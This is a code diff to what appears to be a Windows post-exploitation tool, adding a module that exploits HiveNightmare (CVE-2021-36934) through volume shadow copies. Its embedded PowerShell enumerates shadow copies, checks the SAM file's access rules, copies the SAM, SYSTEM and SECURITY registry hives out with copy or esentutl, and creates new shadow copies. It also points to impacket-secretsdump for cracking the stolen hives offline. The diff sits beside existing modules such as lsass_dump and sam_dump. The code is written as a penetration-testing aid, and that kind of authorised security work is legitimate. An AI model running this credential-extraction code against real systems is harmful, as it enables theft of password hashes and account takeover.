@@ -418,6 +418,10 @@ always_install_elevated: {
     description: "Check and exploit AlwaysInstallElevated policy — when both HKLM and HKCU registry keys are set to 1, any user can install MSI packages with SYSTEM privileges. Optionally run a payload MSI for instant privilege escalation",
     args: "--action check|exploit [--payload MSI_PATH]",
   },
+shadow_copy_abuse: {
+    description: "Volume Shadow Copy abuse for credential extraction — enumerate existing shadow copies, exploit HiveNightmare/SeriousSAM (CVE-2021-36934) to read SAM/SYSTEM/SECURITY from shadow copies as unprivileged user, or create new shadow copies for privileged file access",
+    args: "--action enum|exploit|create [--outdir PATH]",
+  },
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
@@ -14558,6 +14562,205 @@ if ($products) {
   return { output: output.join("\n"), findings }
 }
 
+async function shadowCopyAbuse(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const outdir = argVal(args, "--outdir") || "C:\\Windows\\Temp\\cs-shadow"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Shadow Copy Abuse — credential extraction from volume shadow copies\n"]
+
+  if (action === "enum") {
+    const script = `
+# List existing shadow copies
+Write-Output "[*] Enumerating Volume Shadow Copies..."
+$shadows = Get-WmiObject Win32_ShadowCopy -ErrorAction SilentlyContinue
+
+if ($shadows) {
+    Write-Output "[+] Found $($shadows.Count) shadow copies:"
+    foreach ($s in $shadows) {
+        Write-Output ""
+        Write-Output "    ID: $($s.ID)"
+        Write-Output "    DeviceObject: $($s.DeviceObject)"
+        Write-Output "    InstallDate: $($s.InstallDate)"
+        Write-Output "    VolumeName: $($s.VolumeName)"
+    }
+} else {
+    Write-Output "[-] No shadow copies found"
+}
+
+Write-Output ""
+Write-Output "[*] Checking HiveNightmare/SeriousSAM vulnerability (CVE-2021-36934)..."
+
+# Check if SAM is readable by non-admin via shadow copies
+$samPath = "$env:SystemRoot\\System32\\config\\SAM"
+$samAcl = Get-Acl $samPath -ErrorAction SilentlyContinue
+$vulnerable = $false
+
+if ($samAcl) {
+    foreach ($ace in $samAcl.Access) {
+        $id = $ace.IdentityReference.Value
+        if ($id -match 'BUILTIN\\\\Users|Everyone|Authenticated Users') {
+            if ($ace.FileSystemRights -match 'Read|FullControl') {
+                $vulnerable = $true
+                Write-Output "[+] VULNERABLE — $id has $($ace.FileSystemRights) on SAM!"
+            }
+        }
+    }
+}
+
+if (-not $vulnerable) {
+    # Check via icacls for BUILTIN\Users read access
+    $icaclsOutput = icacls $samPath 2>$null | Out-String
+    if ($icaclsOutput -match 'BUILTIN\\\\Users.*\(RX\)|BUILTIN\\\\Users.*\(R\)|BUILTIN\\\\Users.*\(F\)') {
+        $vulnerable = $true
+        Write-Output "[+] VULNERABLE — BUILTIN\\Users has read access on SAM (icacls)"
+    }
+}
+
+if ($vulnerable -and $shadows) {
+    Write-Output ""
+    Write-Output "[+] EXPLOITABLE — Shadow copies exist AND SAM is world-readable!"
+    Write-Output "    Use: --action exploit to extract hives from shadow copies"
+} elseif ($vulnerable) {
+    Write-Output "[~] SAM is world-readable but no shadow copies — use --action create first"
+} elseif ($shadows) {
+    Write-Output "[~] Shadow copies exist but SAM not world-readable — need admin to extract"
+} else {
+    Write-Output "[-] Not vulnerable to HiveNightmare"
+}
+
+# Also check VSS service status
+$vss = Get-Service VSS -ErrorAction SilentlyContinue
+Write-Output ""
+Write-Output "[*] Volume Shadow Copy Service: $($vss.Status)"
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    if (result.stdout.includes("EXPLOITABLE") || result.stdout.includes("VULNERABLE")) {
+      findings.push({
+        checkId: "WIN-SHADOW-001",
+        provider: "windows",
+        severity: "critical",
+        status: "VULNERABLE",
+        resource: "vss://shadow-copies",
+        title: "HiveNightmare/SeriousSAM (CVE-2021-36934) — SAM readable from shadow copies",
+        details: "SAM hive has overly permissive ACLs — any user can read credentials from shadow copies",
+        remediation: "Apply KB5004945 patch. Delete shadow copies: vssadmin delete shadows /all /quiet. Fix ACLs: icacls %windir%\\system32\\config\\*.* /inheritance:e",
+      })
+    }
+  } else if (action === "exploit") {
+    const script = `
+if (-not (Test-Path '${outdir}')) { New-Item -ItemType Directory -Path '${outdir}' -Force | Out-Null }
+
+# Find shadow copies
+$shadows = Get-WmiObject Win32_ShadowCopy -ErrorAction SilentlyContinue
+if (-not $shadows) {
+    Write-Output "[-] No shadow copies found — use --action create first (requires admin)"
+    exit 1
+}
+
+# Try each shadow copy (newest first)
+$sorted = $shadows | Sort-Object InstallDate -Descending
+$extracted = $false
+
+foreach ($s in $sorted) {
+    $deviceObj = $s.DeviceObject
+    Write-Output "[*] Trying shadow copy: $deviceObj"
+
+    $hives = @("SAM", "SYSTEM", "SECURITY")
+    $allSuccess = $true
+
+    foreach ($hive in $hives) {
+        $src = "$deviceObj\\Windows\\System32\\config\\$hive"
+        $dst = Join-Path '${outdir}' $hive
+
+        # Try direct copy (works if HiveNightmare/ACL vuln)
+        $copyResult = cmd /c "copy $src $dst" 2>$null
+        if (Test-Path $dst) {
+            $size = (Get-Item $dst).Length
+            Write-Output "[+] Extracted: $hive ($size bytes)"
+        } else {
+            # Try esentutl (alternate method)
+            esentutl /y "$src" /d "$dst" 2>$null | Out-Null
+            if (Test-Path $dst) {
+                $size = (Get-Item $dst).Length
+                Write-Output "[+] Extracted (esentutl): $hive ($size bytes)"
+            } else {
+                Write-Output "[-] Failed: $hive"
+                $allSuccess = $false
+            }
+        }
+    }
+
+    if ($allSuccess) {
+        $extracted = $true
+        Write-Output ""
+        Write-Output "[+] All hives extracted from shadow copy!"
+        break
+    }
+    Write-Output "[*] Trying next shadow copy..."
+}
+
+if ($extracted) {
+    Write-Output ""
+    Write-Output "[+] Hives saved to: ${outdir}"
+    Write-Output "[*] Crack offline: impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL"
+} else {
+    Write-Output ""
+    Write-Output "[-] Could not extract from any shadow copy"
+    Write-Output "[*] May need admin privileges. Try: --action create first."
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    if (result.stdout.includes("All hives extracted")) {
+      findings.push({
+        checkId: "WIN-SHADOW-002",
+        provider: "windows",
+        severity: "critical",
+        status: "EXTRACTED",
+        resource: `file://${outdir}`,
+        title: "SAM/SYSTEM/SECURITY extracted from shadow copy (HiveNightmare)",
+        details: `Hives saved to ${outdir} — unprivileged credential extraction`,
+        remediation: "Patch CVE-2021-36934. Delete shadow copies. Fix registry hive ACLs.",
+      })
+    }
+  } else if (action === "create") {
+    const script = `
+Write-Output "[*] Creating new Volume Shadow Copy (requires admin)..."
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+if (-not $isAdmin) {
+    Write-Output "[-] Administrator privileges required to create shadow copies"
+    exit 1
+}
+
+# Create shadow copy
+$shadow = (Get-WmiObject -List Win32_ShadowCopy).Create("C:\\", "ClientAccessible")
+if ($shadow.ReturnValue -eq 0) {
+    $newShadow = Get-WmiObject Win32_ShadowCopy | Sort-Object InstallDate -Descending | Select-Object -First 1
+    Write-Output "[+] Shadow copy created: $($newShadow.DeviceObject)"
+    Write-Output "[*] Now use --action exploit to extract hives"
+} else {
+    # Fallback to vssadmin
+    Write-Output "[*] WMI failed, trying vssadmin..."
+    vssadmin create shadow /for=C: 2>$null
+    $newShadow = Get-WmiObject Win32_ShadowCopy | Sort-Object InstallDate -Descending | Select-Object -First 1
+    if ($newShadow) {
+        Write-Output "[+] Shadow copy created: $($newShadow.DeviceObject)"
+    } else {
+        Write-Output "[-] Failed to create shadow copy"
+    }
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 const dispatch: Record<Program, (args: string[], timeout: number) => Promise<HookResult>> = {
   lsass_dump: lsassDump,
   sam_dump: samDump,
@@ -14643,6 +14846,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   stored_creds_abuse: storedCredsAbuse,
   named_pipe_privesc: namedPipePrivesc,
   always_install_elevated: alwaysInstallElevated,
+  shadow_copy_abuse: shadowCopyAbuse,
 }
 
 export const WinhookTool = Tool.define("winhook", {
